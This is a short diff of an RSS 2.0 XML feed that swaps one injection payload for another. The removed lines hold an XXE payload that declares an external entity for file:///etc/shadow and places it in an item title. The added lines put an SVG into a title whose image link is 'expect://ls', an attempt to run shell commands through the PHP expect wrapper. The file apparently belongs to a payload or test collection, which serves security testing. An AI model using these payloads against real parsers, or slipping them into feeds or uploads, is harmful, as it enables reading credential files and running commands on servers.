@@ -1,5 +1,4 @@
-<!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
+<?xml version="1.0" ?>
 <rss version="2.0">
 <channel>
   <title>Ajax et XML</title>
@@ -15,7 +14,11 @@
       <description>Tout  savoir sur RSS</description>
    </item>
    <item>
-     <title>&ent;</title>
+   <title>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://ls"></image>
+</svg>
+   </title>
     <link>https://www.xul.fr/xml-rdf.php</link> 
     <description>Et  tout savoir sur RDF</description>
    </item>
